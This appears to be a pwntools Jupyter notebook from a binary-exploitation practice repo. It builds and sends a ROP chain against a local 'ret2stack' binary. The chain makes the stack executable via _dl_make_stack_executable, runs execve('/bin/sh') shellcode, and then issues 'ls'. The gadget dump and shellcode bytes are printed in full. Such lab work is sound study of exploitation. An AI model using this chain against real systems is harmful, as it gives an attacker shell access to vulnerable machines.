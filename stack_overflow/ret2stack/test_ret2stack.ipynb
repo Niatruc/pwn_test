{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "The autoreload extension is already loaded. To reload it, use:\n  %reload_ext autoreload\n"
     ]
    }
   ],
   "source": [
    "%load_ext autoreload\n",
    "%autoreload 2\n",
    "formatter = get_ipython().display_formatter.formatters['text/plain']\n",
    "formatter.for_type(int, lambda n, p, cycle: p.text(\"0x%X\" % n))\n",
    "\n",
    "import os\n",
    "os.sys.path.append('../../')\n",
    "\n",
    "from pwn import *\n",
    "from util import *\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "context.clear(arch='amd64')\n",
    "ret2stack = elf.load('./ret2stack')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "os.read(w_pipe, 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [],
   "source": [
    "ret2stack_rop = ROP('./ret2stack')"
   ]
  },
  {
   "source": [
    "# 载荷的构成如下"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "paddings = ret2stack_rop.generatePadding(0, 72)\n",
    "pop_rdi_ret = ret2stack_rop.setRegisters({'rdi': 0})[0][0]\n",
    "__stack_prot = ret2stack_rop.resolve('__stack_prot')\n",
    "pop_rsi_ret = ret2stack_rop.setRegisters({'rsi': 0})[0][0]\n",
    "7\n",
    "mov_ptr_rdi_rsi_ret = 0x446cab\n",
    "pop_rdi_ret\n",
    "__libc_stack_end = ret2stack_rop.resolve('__libc_stack_end')\n",
    "_dl_make_stack_executable = ret2stack_rop.resolve('_dl_make_stack_executable')\n",
    "push_rsp_ret = 0x450804\n",
    "shellcode = asm(shellcraft.sh())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = [\n",
    "    paddings,\n",
    "    pop_rdi_ret,\n",
    "    __stack_prot,\n",
    "    pop_rsi_ret,\n",
    "    7,\n",
    "    mov_ptr_rdi_rsi_ret,\n",
    "    pop_rdi_ret,\n",
    "    __libc_stack_end,\n",
    "    _dl_make_stack_executable,\n",
    "    push_rsp_ret,\n",
    "    shellcode,\n",
    "]\n",
    "\n",
    "# payload_bits = b''\n",
    "for p in payload:\n",
    "    ret2stack_rop.raw(p)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "0x0000:      b'aaaabaaa' b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa'\n0x0008:      b'caaadaaa'\n0x0010:      b'eaaafaaa'\n0x0018:      b'gaaahaaa'\n0x0020:      b'iaaajaaa'\n0x0028:      b'kaaalaaa'\n0x0030:      b'maaanaaa'\n0x0038:      b'oaaapaaa'\n0x0040:      b'qaaaraaa'\n0x0048:         0x400696 pop rdi; ret\n0x0050:         0x6b8e30 __stack_prot\n0x0058:         0x410173 pop rsi; ret\n0x0060:              0x7\n0x0068:         0x446cab\n0x0070:         0x400696 pop rdi; ret\n0x0078:         0x6b89f0 __libc_stack_end\n0x0080:         0x47f9e0 _dl_make_stack_executable\n0x0088:         0x450804\n0x0090:   b'jhH\\xb8/bin' b'jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05'\n0x0098: b'///sPH\\x89\\xe7'\n0x00a0: b'hri\\x01\\x01\\x814$'\n0x00a8: b'\\x01\\x01\\x01\\x011\\xf6Vj'\n0x00b0: b'\\x08^H\\x01\\xe6VH\\x89'\n0x00b8: b'\\xe61\\xd2j;X\\x0f\\x05'\n"
     ]
    }
   ],
   "source": [
    "print(ret2stack_rop.dump())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = ret2stack_rop.chain()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "Gadget(0x401d23, ['pop rsp', 'ret'], ['rsp'], 0x10)"
      ]
     },
     "metadata": {},
     "execution_count": 44
    }
   ],
   "source": [
    "ret2stack_rop.find_gadget(['push rsp'])\n",
    "ret2stack_rop.search(1, ['rsp'])\n",
    "# ret2stack_rop.setRegisters({'rsp': 0})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [],
   "source": [
    "write_pipe(payload + b'\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_line2('ls')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3",
   "language": "python"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9-final"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}